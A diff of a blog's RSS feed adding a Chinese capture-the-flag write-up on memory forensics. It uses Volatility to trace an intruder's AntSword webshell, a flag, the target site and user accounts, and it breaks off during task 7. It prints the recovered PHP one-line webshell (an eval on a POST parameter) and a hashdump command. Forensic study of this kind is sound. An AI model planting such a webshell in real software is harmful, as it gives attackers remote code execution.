@@ -1,4 +1,430 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PDZL</title><link>https://pdzl.github.io/</link><description>Recent content on PDZL</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>PDZL</copyright><lastBuildDate>Wed, 01 Oct 2025 20:28:30 +0800</lastBuildDate><atom:link href="https://pdzl.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>SSRF靶场</title><link>https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/</link><pubDate>Wed, 01 Oct 2025 20:28:30 +0800</pubDate><guid>https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/</guid><description>&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/SSRF.png" alt="Featured image of post SSRF靶场" /&gt;&lt;h2 id="环境准备"&gt;环境准备
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PDZL</title><link>https://pdzl.github.io/</link><description>Recent content on PDZL</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>PDZL</copyright><lastBuildDate>Thu, 09 Oct 2025 09:59:07 +0800</lastBuildDate><atom:link href="https://pdzl.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>solar应急响应-7月</title><link>https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/</link><pubDate>Thu, 09 Oct 2025 09:59:07 +0800</pubDate><guid>https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/</guid><description>&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.png" alt="Featured image of post solar应急响应-7月" /&gt;&lt;h2 id="任务1vol_easy"&gt;【任务1】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;某企业服务器近日遭受隐秘入侵。安全团队通过日志溯源发现，黑客利用Web应用漏洞植入恶意后门，根据溯源的信息配合警方逮捕了黑客，安全团队已经紧急保存了黑客电脑的内存转储文件，请你开始取证以便固定证据。&lt;/p&gt;
+&lt;p&gt;黑客上传的&lt;code&gt;一句话木马&lt;/code&gt;密码是多少？&lt;/p&gt;
+&lt;p&gt;首先看到附件给的.vmem文件以及题目名vol，想到用&lt;code&gt;Volatility&lt;/code&gt;工具进行内存取证分析&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.pslist #查看进程
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009101523912.png"
+width="727"
+height="353"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009101523912_hu_a72ec2599b69d335.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009101523912_hu_958890f1b8454907.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="205"
+data-flex-basis="494px"
+&gt;&lt;/p&gt;
+&lt;p&gt;在文件中搜索是否有.php文件类似的webshell&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.filescan | grep -i &amp;#34;\.php&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009101742427.png"
+width="732"
+height="237"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009101742427_hu_4f0daaabe35d7328.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009101742427_hu_e679e9a1f02ab9a1.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="308"
+data-flex-basis="741px"
+&gt;&lt;/p&gt;
+&lt;p&gt;发现有个ezshell.php.txt，很可能就是&lt;a class="link" href="https://so.csdn.net/so/search?q=%e4%b8%80%e5%8f%a5%e8%af%9d%e6%9c%a8%e9%a9%ac&amp;amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener"
+&gt;一句话木马&lt;/a&gt;所在的文件，那么接下来就是提取文件&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.dumpfiles --physaddr 0x7ddf2280
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;发现文件保存在了&lt;code&gt;file.0x7ddf2280.0xfa801af79b30.DataSectionObject.ezshell.php.txt.dat&lt;/code&gt;，这个.dat文件夹中&lt;/p&gt;
+&lt;p&gt;然后通过以下命令查看文件夹和查看文件&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ls -la *.dat
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009102707876.png"
+width="727"
+height="78"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009102707876_hu_f1003af38153dff3.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009102707876_hu_c9399022021b600d.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="932"
+data-flex-basis="2236px"
+&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat file.0x7ddf2280.0xfa801af79b30.DataSectionObject.ezshell.php.txt.dat
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009102829985.png"
+width="730"
+height="72"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009102829985_hu_3bc6984279a396d4.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009102829985_hu_5e65321940d4d677.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="1013"
+data-flex-basis="2433px"
+&gt;&lt;/p&gt;
+&lt;p&gt;发现一句话木马，密码为&lt;code&gt;solar&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;?php @eval($_POST[&amp;#39;solar&amp;#39;]); ?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="任务2vol_easy"&gt;【任务2】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;黑客使用的木马连接工具叫什么（比如&lt;code&gt;xx.exe&lt;/code&gt;）&lt;/p&gt;
+&lt;p&gt;使用下面的命令查看进程&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.pslist
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009103814962.png"
+width="730"
+height="233"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009103814962_hu_869770fbe6e595b1.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009103814962_hu_4481f81d2996ba7d.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="313"
+data-flex-basis="751px"
+&gt;&lt;/p&gt;
+&lt;p&gt;显然连接工具就是蚁剑，&lt;code&gt;Antsword.exe&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id="任务3vol_easy"&gt;【任务3】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;黑客使用的木马连接工具的位置在哪里（比如&lt;code&gt;C:\xxxx\xx.exe&lt;/code&gt;)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.pslist | grep &amp;#34;AntSword.exe&amp;#34; #查看AntSword.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009104308657.png"
+width="733"
+height="208"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009104308657_hu_56ad6d0e68853e58.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009104308657_hu_d9307c254a967c5f.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="352"
+data-flex-basis="845px"
+&gt;&lt;/p&gt;
+&lt;p&gt;得到PID为&lt;code&gt;1716&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.cmdline --pid 1716 #使用 cmdline 插件查看命令行参数
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009104832023.png"
+width="730"
+height="308"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009104832023_hu_236120922a0f5194.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009104832023_hu_29bc320eee36d358.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="237"
+data-flex-basis="568px"
+&gt;&lt;/p&gt;
+&lt;p&gt;得到了&lt;code&gt;AntSword.exe&lt;/code&gt;的文件位置&lt;code&gt;C:\Tools\AntSword-Loader-v4.0.3-win32-x64\AntSword.exe&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id="任务4vol_easy"&gt;【任务4】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;黑客获取到的&lt;code&gt;FLAG&lt;/code&gt;是什么？&lt;/p&gt;
+&lt;p&gt;直接在文件中搜索flag&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.filescan | grep -i &amp;#34;flag&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009110447599.png"
+width="726"
+height="286"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009110447599_hu_178df17abe0a9e41.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009110447599_hu_f0a3583c28eb9c1e.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="253"
+data-flex-basis="609px"
+&gt;&lt;/p&gt;
+&lt;p&gt;发现有&lt;strong&gt;flag.txt&lt;/strong&gt;的文件&lt;/p&gt;
+&lt;p&gt;输入以下命令&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.dumpfiles --physaddr 0x7da684a0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;#提取文件
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ls -a *.dat #查看文件夹
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat file.0x7da684a0.0xfa801b23e7f0.DataSectionObject.flag.txt.dat #查看信息
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009110904865.png"
+width="727"
+height="468"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009110904865_hu_535810e606edebcf.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009110904865_hu_b238fa4cd7258224.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="155"
+data-flex-basis="372px"
+&gt;&lt;/p&gt;
+&lt;p&gt;得到&lt;code&gt;flag{ok!get_webshell_is_good_idea~}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id="任务5vol_easy"&gt;【任务5】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;黑客入侵的网站地址是多少（只需要&lt;code&gt;http://xxxxx/&lt;/code&gt;）&lt;/p&gt;
+&lt;p&gt;获取进程：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.vadyarascan.VadYaraScan --yara-string &amp;#34;shell.php&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009133806158.png"
+width="768"
+height="394"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009133806158_hu_5be55bd06577e4fb.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009133806158_hu_579b17abcb2ae6f.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="194"
+data-flex-basis="467px"
+&gt;&lt;/p&gt;
+&lt;p&gt;得到PID:&lt;code&gt;1260&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;导出进程内存:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.memmap --pid 1260 --dump
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;会在当前目录生成文件&lt;code&gt;pid.1260.dmp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009134018787.png"
+width="111"
+height="110"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009134018787_hu_4e88078be05e3238.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009134018787_hu_eb5cd910b2ede096.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="100"
+data-flex-basis="242px"
+&gt;&lt;/p&gt;
+&lt;p&gt;获取dump文件中关键字符：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;find . -name &amp;#34;pid.1260.dmp&amp;#34; -type f | head -5 | while read file; do
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; echo &amp;#34;=== 检查文件: $file ===&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; strings &amp;#34;$file&amp;#34; | grep &amp;#34;http://192.168&amp;#34; | head -3
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;done
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009134108485.png"
+width="805"
+height="229"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009134108485_hu_5e45a5a596f5b38a.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009134108485_hu_a2300d60d898bcb2.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="351"
+data-flex-basis="843px"
+&gt;&lt;/p&gt;
+&lt;p&gt;入侵网址为：&lt;code&gt; http://192.168.186.140&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id="任务6vol_easy"&gt;【任务6】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;黑客入侵时，使用的系统用户名是什么&lt;/p&gt;
+&lt;p&gt;Windows用户账户信息存储在注册表的SAM hive中，那么就要找到SAM的虚拟地址，来提取用户列表&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.registry.hivelist.HiveList
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.registry.hashdump.Hashdump
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009154806725.png"
+width="732"
+height="159"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009154806725_hu_cfe0304b0da377c0.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009154806725_hu_d8998310d4e9cd04.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="460"
+data-flex-basis="1104px"
+&gt;&lt;/p&gt;
+&lt;p&gt;然后发现只有两个用户，可见黑客使用的用户名应为&lt;code&gt;Administrator&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id="任务7vol_easy"&gt;【任务7】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;黑客创建隐藏账户的密码是多少？&lt;/p&gt;
+&lt;p&gt;已知黑客使用蚁剑入侵，其PID为&lt;code&gt;1716&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;使用命令生成&lt;code&gt;pid.1716.dmp&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.memmap --pid 1716 --dump
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009161510207.png"
+width="98"
+height="92"
